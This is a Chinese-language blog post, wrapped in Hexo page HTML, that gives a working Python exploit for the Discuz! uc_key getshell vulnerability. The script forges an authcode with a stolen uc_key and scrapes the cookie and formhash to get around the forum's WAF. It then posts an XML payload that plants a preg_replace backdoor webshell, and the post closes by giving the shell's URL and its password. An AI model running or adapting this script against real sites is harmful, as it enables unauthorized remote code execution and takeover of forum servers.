@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="web,python," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="一、漏洞参考：http://drops.wooyun.org/papers/7830 http://www.wooyun.org/bugs/wooyun-2010-0137991 漏洞原理讲的很清楚了，不再多说。其中一哥已经放出了php版的exp，自己写python版的原因，主要有以下原因： 1.对于discuzx3.2之后的，如果要利用这个漏洞去getshell必须带着cookie和formha">
+<meta name="keywords" content="web,python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Discuz! uc_key getshell python利用脚本(新)">
+<meta property="og:url" content="http://yoursite.com/2015/11/23/Discuzx系列用uc-key-getshell-python利用脚本-新/index.html">
+<meta property="og:site_name" content="Answer">
+<meta property="og:description" content="一、漏洞参考：http://drops.wooyun.org/papers/7830 http://www.wooyun.org/bugs/wooyun-2010-0137991 漏洞原理讲的很清楚了，不再多说。其中一哥已经放出了php版的exp，自己写python版的原因，主要有以下原因： 1.对于discuzx3.2之后的，如果要利用这个漏洞去getshell必须带着cookie和formha">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-09-23T14:39:18.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Discuz! uc_key getshell python利用脚本(新)">
+<meta name="twitter:description" content="一、漏洞参考：http://drops.wooyun.org/papers/7830 http://www.wooyun.org/bugs/wooyun-2010-0137991 漏洞原理讲的很清楚了，不再多说。其中一哥已经放出了php版的exp，自己写python版的原因，主要有以下原因： 1.对于discuzx3.2之后的，如果要利用这个漏洞去getshell必须带着cookie和formha">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2015/11/23/Discuzx系列用uc-key-getshell-python利用脚本-新/"/>
+
+
+
+
+
+  <title>Discuz! uc_key getshell python利用脚本(新) | Answer</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Answer</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">不想成为别人眼中的自己</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2015/11/23/Discuzx系列用uc-key-getshell-python利用脚本-新/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Answer">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Answer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Discuz! uc_key getshell python利用脚本(新)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-23T11:22:32+08:00">
+                2015-11-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="一、漏洞参考："><a href="#一、漏洞参考：" class="headerlink" title="一、漏洞参考："></a>一、漏洞参考：</h2><p><a href="http://drops.wooyun.org/papers/7830" target="_blank" rel="external">http://drops.wooyun.org/papers/7830</a></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0137991" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0137991</a></p>
+<p>漏洞原理讲的很清楚了，不再多说。其中一哥已经放出了php版的exp，自己写python版的原因，主要有以下原因：</p>
+<p>1.对于discuzx3.2之后的，如果要利用这个漏洞去getshell必须带着cookie和formhash，不然会因为post中带有’&lt;’等特殊字符被discuz的waf拦截(一哥也提出来了)，但是手动去获取cookie再去找formhash然后一起发包，这实在是在过于麻烦。</p>
+<h2 id="二、python的requests模块"><a href="#二、python的requests模块" class="headerlink" title="二、python的requests模块"></a>二、python的requests模块</h2><p>主要利用requests模块</p>
+<p>第一次用get请求获得cookie和formhash，第二次带着cookie和formhash和exp代码发一个post包获得shell</p>
+<p>(对于discuzx3.2省去了抓cookie和找fromhash的功夫)。</p>
+<p>其中的uc_key的的算法是直接用前辈的，在此感谢。</p>
+<p>代码如下：</p>
+<figure class="highlight plain"><figcaption><span>sys</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line">import hashlib</div><div class="line">import time</div><div class="line">import math</div><div class="line">import base64</div><div class="line">import urllib2 </div><div class="line">import urllib</div><div class="line">import re</div><div class="line">import requests</div><div class="line">import json</div><div class="line">global cookie</div><div class="line">global formhash</div><div class="line"></div><div class="line">def microtime(get_as_float = False) :</div><div class="line">    if get_as_float:</div><div class="line">        return time.time()</div><div class="line">    else:</div><div class="line">        return &apos;%.8f %d&apos; % math.modf(time.time())</div><div class="line">    </div><div class="line">def get_authcode(string, key = &apos;&apos;):</div><div class="line">    ckey_length = 4</div><div class="line">    key = hashlib.md5(key).hexdigest()</div><div class="line">    keya = hashlib.md5(key[0:16]).hexdigest()</div><div class="line">    keyb = hashlib.md5(key[16:32]).hexdigest()</div><div class="line">    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]</div><div class="line">    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest() </div><div class="line">    key_length = len(cryptkey)</div><div class="line">    string = &apos;0000000000&apos; + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string</div><div class="line">    string_length = len(string)</div><div class="line">    result = &apos;&apos;</div><div class="line">    box = range(0, 256)</div><div class="line">    rndkey = dict()</div><div class="line">    for i in range(0,256):</div><div class="line">        rndkey[i] = ord(cryptkey[i % key_length])</div><div class="line">    j=0</div><div class="line">    for i in range(0,256):</div><div class="line">        j = (j + box[i] + rndkey[i]) % 256</div><div class="line">        tmp = box[i]</div><div class="line">        box[i] = box[j]</div><div class="line">        box[j] = tmp</div><div class="line">    a=0</div><div class="line">    j=0</div><div class="line">    for i in range(0,string_length):</div><div class="line">        a = (a + 1) % 256</div><div class="line">        j = (j + box[a]) % 256</div><div class="line">        tmp = box[a]</div><div class="line">        box[a] = box[j]</div><div class="line">        box[j] = tmp</div><div class="line">        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))</div><div class="line">        length=len(result)</div><div class="line">    return keyc + base64.b64encode(result).replace(&apos;=&apos;, &apos;&apos;)</div><div class="line">def get_cookie_formhash(host):</div><div class="line">    global cookie</div><div class="line">    global formhash</div><div class="line">    headers = &#123;&apos;content-type&apos;: &apos;application/json&apos;&#125;</div><div class="line">    r=requests.get(host,headers=headers)</div><div class="line">    cookie=r.cookies</div><div class="line">    hash=re.findall(r&apos;formhash&quot; value=&quot;[0-9A-z]&#123;1,10&#125;&quot;&apos;,r.text)</div><div class="line">    _formhash=re.findall(r&apos;&quot;[0-9A-z]&#123;1,10&#125;&quot;&apos;,hash[0])</div><div class="line">    formhash=_formhash[0].replace(&apos;&quot;&apos;,&apos;&apos;) </div><div class="line">def getshell(host,key):</div><div class="line">    global cookie</div><div class="line">    global formhash</div><div class="line">    header = &#123;&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; WOW64)&apos;&#125;</div><div class="line">    tm=time.time()+10*3600</div><div class="line">    agent=hashlib.md5(&quot;Mozilla/5.0 (Windows NT 6.1; WOW64)&quot;)</div><div class="line">    string=&quot;agent=%s&amp;time=%s&amp;action=updatebadwords&quot; % (agent,tm)</div><div class="line">    code=urllib.quote(get_authcode(string,key))</div><div class="line">    get_cookie_formhash(host)</div><div class="line">    url=&quot;%s/api/uc.php?code=%s&amp;formhash=%s&quot; % (host,code,formhash)</div><div class="line">    payload=&apos;&apos;&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;item id=&quot;0&quot;&gt;</div><div class="line"> &lt;item id=&quot;findpattern&quot;&gt;/admin/e&lt;/item&gt;</div><div class="line">  &lt;item id=&quot;replacement&quot;&gt;@preg_replace(chr(47).chr(47).chr(101),$_POST[c],chr(098));&lt;/item&gt;</div><div class="line">  &lt;/item&gt;</div><div class="line"> &lt;/root&gt;&apos;&apos;&apos;</div><div class="line">    r=requests.post(url,data=payload,cookies=cookie,headers=header)</div><div class="line">    print url</div><div class="line">    print r.text</div><div class="line">    if re.findall(&apos;^1&apos;,r.text):</div><div class="line">        print &apos;success shell is %s/forum.php?mod=ajax&amp;inajax=yes&amp;infloat=register&amp;handlekey=register&amp;ajaxmenu=1&amp;action=checkusername&amp;username=admin    password is c&apos; % (host)</div><div class="line">	#判断shell成功就随便写的，不太准 还是以人工测试为主吧。</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    getshell(&apos;http://192.168.144.1/www/discuzx3.2/upload&apos;,&apos;xc66RaW6v3J7p376z2DePec5UcQ0m33bJ8Cd78UdZ74er6i85372weY59e7b5fuf&apos;)</div></pre></td></tr></table></figure>
+<p>填上discuz的url和uc_key就可以利用了</p>
+<p>shell地址：</p>
+<p><a href="http://url/forum.php?mod=ajax&amp;inajax=yes&amp;infloat=register&amp;handlekey=register&amp;ajaxmenu=1&amp;action=checkusername&amp;username=admin" target="_blank" rel="external">http://url/forum.php?mod=ajax&amp;inajax=yes&amp;infloat=register&amp;handlekey=register&amp;ajaxmenu=1&amp;action=checkusername&amp;username=admin</a> </p>
+<p> 密码：c</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/02/04/我是如何收集厂商ip段，并进行简单的信息探测的/" rel="prev" title="我是如何收集厂商ip段，并进行简单的信息探测的">
+                我是如何收集厂商ip段，并进行简单的信息探测的 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/avatar.gif"
+              alt="Answer" />
+          
+            <p class="site-author-name" itemprop="name">Answer</p>
+            <p class="site-description motion-element" itemprop="description">我就是我</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、漏洞参考："><span class="nav-number">1.</span> <span class="nav-text">一、漏洞参考：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、python的requests模块"><span class="nav-number">2.</span> <span class="nav-text">二、python的requests模块</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Answer</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
